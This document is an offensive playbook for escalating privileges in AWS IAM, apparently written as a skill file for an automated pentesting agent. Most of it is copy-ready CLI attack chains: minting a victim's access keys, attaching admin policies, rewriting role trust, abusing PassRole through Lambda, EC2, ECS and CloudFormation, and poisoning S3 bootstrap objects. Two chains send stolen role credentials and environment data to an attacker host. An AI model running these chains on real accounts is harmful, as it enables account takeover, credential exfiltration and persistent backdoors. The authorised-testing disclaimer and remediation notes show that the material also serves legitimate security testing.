# AWS Privilege Escalation — Skill Playbook

**Mitre ATT&CK ID:** T1068 (Exploitation for Privilege Escalation), T1548 (Abuse Elevation Control Mechanism), T1078 (Valid Accounts), T1098.003 (Additional Cloud Credentials)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** Critical
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: aws-privesc-v1
category: aws-iam
cloud_provider: aws
author: HiveBreach
mitre_attack_id:
  - T1068
  - T1548
  - T1078
  - T1098.003
owasp_mapping:
  - A01:2021-Broken Access Control
tags:
  - aws
  - iam
  - privilege-escalation
  - lambda
  - ecs
  - cloudformation
  - pacu
tools:
  - aws-cli
  - pacu
  - enumerate-iam
  - cloudsplaining
  - pmapper
  - cloudfox
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Establish Baseline Permissions

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>

aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<acct>:user/<user> \
  --action-names iam:CreateAccessKey iam:AttachUserPolicy iam:PutUserPolicy \
    iam:CreatePolicyVersion iam:UpdateAssumeRolePolicy iam:PassRole sts:AssumeRole \
    lambda:CreateFunction lambda:UpdateFunctionCode s3:PutObject \
  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table
```

### 1.2 Targeted Enumeration

```bash
for r in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
  aws iam get-role --role-name "$r" --query 'Role.AssumeRolePolicyDocument' --output json 2>/dev/null | \
    python3 -c "import json,sys; d=json.load(sys.stdin)
for s in d.get('Statement',[]):
    if s.get('Principal') in ({'Service':'ec2.amazonaws.com'},{'Service':'lambda.amazonaws.com'}): print('PASSABLE ROLE')"
done
```

---

## 2. Confirmation

### 2.1 Static Analysis Tools

```bash
aws iam get-account-authorization-details > /tmp/authz.json
cloudsplaining scan --input-file /tmp/authz.json --output /tmp/csplaining

pmapper graph create --account <acct>
pmapper query 'preset privesc *'

pacu
Pacu > set_keys
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run iam__privesc_scan
```

---

## 3. Exploitation — Privilege Escalation Chain Catalog

### 3.1 iam:CreateAccessKey

```bash
aws iam create-access-key --user-name victim --output json
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
```

### 3.2 Attach / Inline Admin Policy

```bash
aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam put-user-policy --user-name <user> --policy-name Admin \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### 3.3 iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion

```bash
aws iam list-attached-user-policies --user-name <user>   # pick attached policy ARN
aws iam create-policy-version \
  --policy-arn <policy-arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

### 3.4 iam:UpdateAssumeRolePolicy

```bash
aws iam update-assume-role-policy \
  --role-name <target-role> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"<attacker-arn>"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<target-role> --role-session-name esc
```

### 3.5 iam:PassRole + Lambda

```bash
aws iam get-role --role-name <priv-role> --query 'Role.Arn' --output text
cat > payload.py << 'EOF'
import boto3
def handler(event, context):
    return boto3.client("sts").get_caller_identity()["Arn"]
EOF
zip -q payload.zip payload.py
aws lambda create-function --function-name esc-<id> --runtime python3.12 \
  --role arn:aws:iam::<acct>:role/<priv-role> \
  --handler payload.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name esc-<id> --payload '{}' out.json && cat out.json
```

### 3.6 iam:PassRole + EC2 RunInstances

```bash
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.micro \
  --iam-instance-profile Name=<profile-with-priv-role> \
  --user-data "#!/bin/bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<priv-role> | curl -s -X POST http://<attacker>/c --data-binary @-"
```

### 3.7 iam:PassRole + ECS RunTask

```bash
aws ecs register-task-definition --family esc-<id> \
  --task-role-arn arn:aws:iam::<acct>:role/<priv-role> --network-mode awsvpc \
  --container-definitions '[{"name":"c","image":"alpine:3.19","command":["sh","-c","wget --post-file=/proc/self/environ http://<attacker>/"]}]'
aws ecs run-task --cluster <cluster> --task-definition esc-<id> \
  --launch-type FARGATE \
  --network-configuration '{"awsvpcConfiguration":{"subnets":["subnet-xxx"],"assignPublicIp":"ENABLED"}}'
```

### 3.8 iam:PassRole + CloudFormation CreateStack

```bash
cat > esc.yml << 'EOF'
Resources:
  Inst:
    Type: AWS::IAM::User
    Properties:
      UserName: esc-user
      Policies:
        - PolicyName: admin
          PolicyDocument:
            Version: "2012-10-17"
            Statement: [{Effect: Allow, Action: "*", Resource: "*"}]
EOF
aws cloudformation create-stack --stack-name esc-<id> --template-body file://esc.yml \
  --role-arn arn:aws:iam::<acct>:role/<priv-role> --capabilities CAPABILITY_NAMED_IAM
```

### 3.9 sts:AssumeRole (wildcard / permissive trust) + s3 bootstrap poisoning

```bash
for r in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
  aws sts assume-role --role-arn "arn:aws:iam::<acct>:role/$r" --role-session-name esc 2>/dev/null \
    && echo "ASSUMED $r"
done
aws s3 cp evil-object s3://code-bucket/<bootstrap> --acl bucket-owner-full-control
```

---

## 4. Tool-Guidance

### 4.1 Pacu privesc modules

```bash
pacu
Pacu > set_keys
Pacu > run iam__privesc_scan
Pacu > run iam__backdoor_users_keys --role-name <admin-role>
Pacu > run iam__backdoor_assume_role
```

### 4.2 Enumerate-IAM / Cloudsplaining / PMapper

```bash
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
cloudsplaining scan --input-file authz.json --output out
pmapper query 'preset privesc *'
```

---

## 5. PoC Generation

### PoC Template

```markdown
## AWS Privilege Escalation — [FINDING_ID]

**Principal:** arn:aws:iam::ACCOUNT:user/<user>
**Primitive:** iam:CreatePolicyVersion (on policy <name>)
**Chain:** user -> CreatePolicyVersion(Admin v6) -> SetDefaultPolicyVersion -> full admin

### Proof
1. Baseline: `simulate-principal-policy` allowed CreatePolicyVersion
2. Created v6 `"Action":"*","Resource":"*"`, set as default
3. `aws s3 ls` succeeded with original credentials; cleanup restored default

### Impact
- Account compromise; data access (T1530); persistence (T1098.003)

### Remediation
- Remove iam:CreatePolicyVersion from non-admin principals
- Apply permission boundaries and SCP deny on IAM mutations
```

---

## 6. Verification

- [ ] Every chain proven in an isolated AWS sandbox account
- [ ] Original policy state captured and restored after each test
- [ ] `simulate-principal-policy` matches observed behavior
- [ ] Pacu `iam__privesc_scan` and manual chain cross-confirmed
- [ ] CloudTrail reviewed for the exact API call sequence used
- [ ] All created functions/stacks/tasks/users/keys deleted post-test

---

## 7. CheatSheet

| Permission | Chain | Verify |
|---|---|---|
| `iam:CreateAccessKey` | user -> keys -> victim identity | `get-caller-identity` |
| `iam:CreatePolicyVersion` | policy -> admin version -> default | `s3 ls` |
| `iam:UpdateAssumeRolePolicy` | role trust -> attacker -> assume | `assume-role` |
| `iam:PassRole` | +Lambda/EC2/ECS/CFN -> exec role | `lambda invoke` |
| `sts:AssumeRole` | any role -> session | `assume-role` |
| `s3:PutObject` | poison bootstrap -> role executes | callback |

```bash
aws iam get-account-authorization-details > authz.json
cloudsplaining scan --input-file authz.json --output out
pacu > run iam__privesc_scan
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1068 | Exploitation for Privilege Escalation | Core escalation primitive |
| T1548 | Abuse Elevation Control Mechanism | Trust/policy manipulation |
| T1078 | Valid Accounts | Using assumed identity |
| T1098.003 | Additional Cloud Credentials | Access keys backdoor |
| T1552.005 | Cloud Instance Metadata API | EC2 role credential theft |
| T1526 | Cloud Service Discovery | Enumeration phase |

---

## 9. References

- Rhino Security Labs — AWS IAM Privilege Escalation Methods: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Pacu: https://github.com/RhinoSecurityLabs/pacu
- Cloudsplaining: https://cloudsplaining.readthedocs.io/en/latest/
- PMapper: https://github.com/nccgroup/PMapper
- Enumerate-IAM: https://github.com/andresriancho/enumerate-iam
- CloudFox: https://github.com/BishopFox/cloudfox

---

*This playbook is for authorised security testing only. All verification must occur in AWS sandbox accounts.*
